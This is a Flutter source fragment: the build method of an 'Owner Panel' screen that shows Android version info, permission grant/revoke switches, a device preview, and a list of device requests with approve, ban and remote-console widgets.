  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(
        backgroundColor: kBg,
        title: const Text('Owner Panel', style: TextStyle(color: kGold)),
        actions: [
          IconButton(onPressed: _checkAllPerms, icon: const Icon(Icons.sync, color: kGold)),
          IconButton(onPressed: _load, icon: const Icon(Icons.refresh, color: kGold)),
        ],
      ),
      body: ListView(
        padding: const EdgeInsets.only(bottom: 30),
        children: [
          Container(
            margin: const EdgeInsets.fromLTRB(12, 12, 12, 0),
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: const Color(0xFF1A1A2E),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.blueAccent.withOpacity(0.3)),
            ),
            child: Row(
              children: [
                const Icon(Icons.phone_android, color: Colors.blueAccent, size: 28),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _androidSdk > 0
                            ? '${_androidVersionName()} (SDK $_androidSdk)'
                            : 'Loading...',
                        style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
                      ),
                      Text(
                        _androidSdk >= 37
                            ? 'Android 17 — special rules active'
                            : _androidSdk >= 33
                                ? 'Android 13+ — granular media permissions'
                                : 'Android 10-12 — legacy storage',
                        style: const TextStyle(color: Colors.white60, fontSize: 12),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          Container(
            margin: const EdgeInsets.all(12),
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: const Color(0xFF1E1E1E),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: kGold.withOpacity(0.3)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Row(
                  children: [
                    Icon(Icons.security_rounded, color: kGold, size: 22),
                    SizedBox(width: 10),
                    Text('Device Permissions',
                        style: TextStyle(color: kGold, fontSize: 17, fontWeight: FontWeight.bold)),
                  ],
                ),
                const SizedBox(height: 4),
                const Text('Switch ON = grant • Switch OFF = revoke',
                    style: TextStyle(color: Colors.white38, fontSize: 12)),
                const SizedBox(height: 16),
                if (_permLoading)
                  const Center(
                    child: Padding(
                      padding: EdgeInsets.all(20),
                      child: CircularProgressIndicator(color: kGold),
                    ),
                  )
                else
                  ..._permStatuses.entries.map((e) {
                    final name = e.key;
                    final status = e.value;
                    final isLegacy = name == 'Storage (Legacy)' && _androidSdk >= 33;
                    return Container(
                      margin: const EdgeInsets.symmetric(vertical: 3),
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                      decoration: BoxDecoration(
                        color: const Color(0xFF252525),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Row(
                        children: [
                          Icon(_permIcon(name),
                              color: isLegacy ? Colors.white24 : Colors.white70, size: 20),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(name,
                                    style: TextStyle(
                                        color: isLegacy ? Colors.white24 : Colors.white,
                                        fontSize: 14, fontWeight: FontWeight.w500)),
                                if (isLegacy)
                                  const Text('Not needed on Android 13+',
                                      style: TextStyle(color: Colors.white24, fontSize: 10)),
                              ],
                            ),
                          ),
                          Text(_statusText(status),
                              style: TextStyle(
                                  color: isLegacy ? Colors.white24 : _statusColor(status),
                                  fontSize: 11, fontWeight: FontWeight.bold)),
                          const SizedBox(width: 6),
                          SizedBox(
                            height: 34,
                            width: 46,
                            child: Switch(
                              value: isLegacy ? true : status.isGranted,
                              activeColor: kGold,
                              onChanged: isLegacy
                                  ? null
                                  : (v) async {
                                      if (v) {
                                        await _requestSingle(name);
                                      } else {
                                        await _toggleOff(name);
                                      }
                                    },
                            ),
                          ),
                        ],
                      ),
                    );
                  }),
                const SizedBox(height: 16),
                SizedBox(
                  width: double.infinity,
                  height: 48,
                  child: ElevatedButton.icon(
                    onPressed: _permLoading ? null : _grantAllPerms,
                    icon: const Icon(Icons.check_circle_outline, size: 20),
                    label: const Text('Grant All Permissions',
                        style: TextStyle(fontSize: 15, fontWeight: FontWeight.bold)),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: kGold.withOpacity(0.2),
                      foregroundColor: kGold,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                SizedBox(
                  width: double.infinity,
                  height: 42,
                  child: OutlinedButton.icon(
                    onPressed: () => openAppSettings(),
                    icon: const Icon(Icons.settings, size: 18),
                    label: const Text('Open App Settings'),
                    style: OutlinedButton.styleFrom(
                      foregroundColor: Colors.white54,
                      side: const BorderSide(color: Colors.white24),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                ),
              ],
            ),
          ),
          const DevicePreviewCard(),
          const Padding(
            padding: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            child: Text('User Requests + Remote Control',
                style: TextStyle(color: kGold, fontSize: 16, fontWeight: FontWeight.bold)),
          ),
          _busy && _rows.isEmpty
              ? const Center(child: Padding(
                  padding: EdgeInsets.all(30),
                  child: CircularProgressIndicator(color: kGold)))
              : _rows.isEmpty
                  ? const Center(child: Padding(
                      padding: EdgeInsets.all(30),
                      child: Text('No requests yet', style: TextStyle(color: Colors.white54))))
                  : ListView.builder(
                      shrinkWrap: true,
                      physics: const NeverScrollableScrollPhysics(),
                      itemCount: _rows.length,
                      itemBuilder: (_, i) {
                        final r  = _rows[i];
                        final st = r['status'] ?? '';
                        if (st == 'BANNED') return const SizedBox.shrink();
                        return Card(
                          color: const Color(0xFF1E1E1E),
                          margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                          child: Padding(
                            padding: const EdgeInsets.all(12),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text('${i + 1}) ${r['id']}',
                                    style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                                Text('ID: ${r['device']}  •  ${r['method']}',
                                    style: const TextStyle(color: Colors.white54, fontSize: 12)),
                                Text('Perms: ${(r['perms'] ?? '').isEmpty ? '—' : r['perms']}  •  $st',
                                    style: TextStyle(
                                        color: st == 'BANNED' ? Colors.red
                                            : (st == 'APPROVED' ? Colors.green : Colors.orange),
                                        fontSize: 12)),
                                const SizedBox(height: 8),
                                Row(children: [
                                  ElevatedButton(
                                      onPressed: () => _act(r['device']!, 'approve'),
                                      style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                                      child: const Text('ADD', style: TextStyle(color: Colors.white))),
                                  const SizedBox(width: 8),
                                  ElevatedButton(
                                      onPressed: () => _act(r['device']!, 'ban'),
                                      style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                                      child: const Text('BAN', style: TextStyle(color: Colors.white))),
                                ]),
                                const SizedBox(height: 8),
                                RemoteConsoleCard(
                                    deviceId: r['device']!, label: r['id'] ?? 'Device'),
                              ],
                            ),
                          ),
                        );
                      }),
        ],
      ),
    );
  }
}
